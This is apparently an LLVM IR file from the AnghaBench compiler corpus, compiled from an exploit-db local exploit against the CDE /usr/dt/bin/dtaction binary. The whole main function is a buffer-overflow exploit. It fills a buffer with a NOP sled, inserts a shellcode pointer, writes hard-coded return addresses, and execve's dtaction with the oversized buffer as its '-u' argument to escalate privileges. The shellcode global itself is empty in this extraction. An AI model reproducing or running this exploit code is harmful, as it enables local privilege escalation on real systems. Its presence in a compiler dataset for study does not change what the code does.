; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19497.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19497.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.passwd = type { i8* }

@.str = private unnamed_addr constant [9 x i8] c"getpwuid\00", align 1
@BUFLEN = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [21 x i8] c"/usr/dt/bin/dtaction\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-u\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"Run\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"/usr/bin/id\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.6 = private unnamed_addr constant [23 x i8] c"forgot to set DISPLAY\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"DISPLAY=\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca [6 x i8*], align 16
  %2 = alloca [3 x i8*], align 16
  %3 = alloca [2048 x i8], align 16
  %4 = alloca i64*, align 8
  %5 = alloca %struct.passwd*, align 8
  %6 = alloca i32, align 4
  %7 = call i32 (...) @getuid()
  %8 = call %struct.passwd* @getpwuid(i32 %7)
  store %struct.passwd* %8, %struct.passwd** %5, align 8
  %9 = icmp eq %struct.passwd* %8, null
  br i1 %9, label %10, label %13

10:                                               ; preds = %0
  %11 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @exit(i32 1) #3
  unreachable

13:                                               ; preds = %0
  %14 = load i32, i32* @BUFLEN, align 4
  %15 = load %struct.passwd*, %struct.passwd** %5, align 8
  %16 = getelementptr inbounds %struct.passwd, %struct.passwd* %15, i32 0, i32 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = sub nsw i32 %14, %18
  store i32 %19, i32* %6, align 4
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  %21 = load i32, i32* %6, align 4
  %22 = call i32 @memset(i8* %20, i32 144, i32 %21)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 500
  %24 = load i8*, i8** @exploit_code, align 8
  %25 = load i8*, i8** @exploit_code, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = call i32 @strncpy(i8* %23, i8* %24, i32 %26)
  %28 = load i32, i32* %6, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 %29
  %31 = bitcast i8* %30 to i64*
  store i64* %31, i64** %4, align 8
  %32 = load i64*, i64** %4, align 8
  %33 = getelementptr inbounds i64, i64* %32, i32 1
  store i64* %33, i64** %4, align 8
  store i64 937195419, i64* %32, align 8
  %34 = load i64*, i64** %4, align 8
  %35 = getelementptr inbounds i64, i64* %34, i32 1
  store i64* %35, i64** %4, align 8
  store i64 3752813826, i64* %34, align 8
  %36 = load i64*, i64** %4, align 8
  %37 = getelementptr inbounds i64, i64* %36, i32 1
  store i64* %37, i64** %4, align 8
  store i64 134550064, i64* %36, align 8
  %38 = load i64*, i64** %4, align 8
  %39 = getelementptr inbounds i64, i64* %38, i32 1
  store i64* %39, i64** %4, align 8
  store i64 134511032, i64* %38, align 8
  %40 = load i64*, i64** %4, align 8
  %41 = getelementptr inbounds i64, i64* %40, i32 1
  store i64* %41, i64** %4, align 8
  store i64 134510352, i64* %40, align 8
  %42 = load i64*, i64** %4, align 8
  store i64 0, i64* %42, align 8
  %43 = call i8* @strdup(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %44 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 0
  store i8* %43, i8** %44, align 16
  %45 = call i8* @strdup(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %46 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 1
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  %48 = call i8* @strdup(i8* %47)
  %49 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 2
  store i8* %48, i8** %49, align 16
  %50 = call i8* @strdup(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %51 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 3
  store i8* %50, i8** %51, align 8
  %52 = call i8* @strdup(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  %53 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 4
  store i8* %52, i8** %53, align 16
  %54 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 5
  store i8* null, i8** %54, align 8
  %55 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %56 = icmp ne i8* %55, null
  br i1 %56, label %60, label %57

57:                                               ; preds = %13
  %58 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0))
  %59 = call i32 @exit(i32 1) #3
  unreachable

60:                                               ; preds = %13
  %61 = call i32 @strlen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %62 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %63 = call i32 @strlen(i8* %62)
  %64 = add nsw i32 %61, %63
  %65 = add nsw i32 %64, 1
  %66 = call i8* @malloc(i32 %65)
  %67 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  store i8* %66, i8** %67, align 16
  %68 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  %69 = load i8*, i8** %68, align 16
  %70 = call i32 @strcpy(i8* %69, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %71 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  %72 = load i8*, i8** %71, align 16
  %73 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %74 = call i32 @strcat(i8* %72, i8* %73)
  %75 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 1
  store i8* null, i8** %75, align 8
  %76 = getelementptr inbounds [6 x i8*], [6 x i8*]* %1, i64 0, i64 0
  %77 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  %78 = call i32 @execve(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i8** %76, i8** %77)
  ret i32 0
}

declare dso_local %struct.passwd* @getpwuid(i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
